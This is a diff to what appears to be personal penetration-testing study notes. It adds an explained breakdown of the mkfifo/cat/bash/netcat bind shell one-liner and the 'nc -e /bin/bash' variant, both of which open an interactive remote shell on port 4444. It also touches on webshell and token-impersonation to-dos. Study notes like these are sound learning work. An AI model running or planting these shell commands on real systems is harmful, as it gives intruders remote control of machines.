@@ -126,5 +126,32 @@ CreateObject("Wscript.Shell").Run Str
 
 ---
 
+---
+
+## mkfifo bind shell: why the named pipe / cat / bash triangle
+
+**Full command:**
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f
+```
+
+**Piece by piece:**
+- `rm /tmp/f` → delete any leftover named pipe from a previous run. `mkfifo` fails if the path already exists.
+- `mkfifo /tmp/f` → create a **named pipe** (FIFO) at `/tmp/f`. A named pipe is a special file that connects two processes: one reads from one end, another writes to the other. Unlike a regular file, data written to one end comes out the other immediately with no disk buffering.
+- `cat /tmp/f` → reads from the named pipe. Initially blocks, waiting for data. This is the "input side" — it delivers the attacker's commands to bash.
+- `| /bin/bash -i 2>&1` → pipe the output of cat into an interactive bash shell. Every line cat reads from the fifo becomes a command bash executes. `2>&1` sends bash's stderr into the same pipe as stdout, so error messages reach the attacker.
+- `| nc -lvp 4444 > /tmp/f` → nc listens on port 4444. When the attacker connects, nc receives the attacker's typed input. `> /tmp/f` writes that input into the named pipe — which cat is reading from the other end.
+
+**The loop that makes it work:**
+Attacker types command → nc receives it → nc writes to `/tmp/f` → cat reads from `/tmp/f` → bash executes the command → bash output goes to nc → nc sends it to the attacker.
+The named pipe creates the feedback loop: nc's stdout feeds back into nc's input via bash, completing the two-way shell channel over a single connection.
+
+**Why `nc -e /bin/bash` doesn't always work:**
+The traditional `-e` flag (`nc -e /bin/bash -lvp 4444`) spawns a process with nc's stdin/stdout connected directly. But many Linux distributions ship OpenBSD netcat (`nc.openbsd`) which removes the `-e` flag for security reasons. The mkfifo pattern achieves the same result using only POSIX tools, with no `-e` required.
+
+**Where this comes from:** Classic Unix sysadmin pattern for bidirectional piping. Documented in various red team references and `man mkfifo`.
+
+🔁 [[Shells & Payloads#Bind shells|Command Appendix]]
+
 ## **Outstanding**
 - [ ] CFM webshell tag syntax, JuicyPotato CLSID token impersonation.
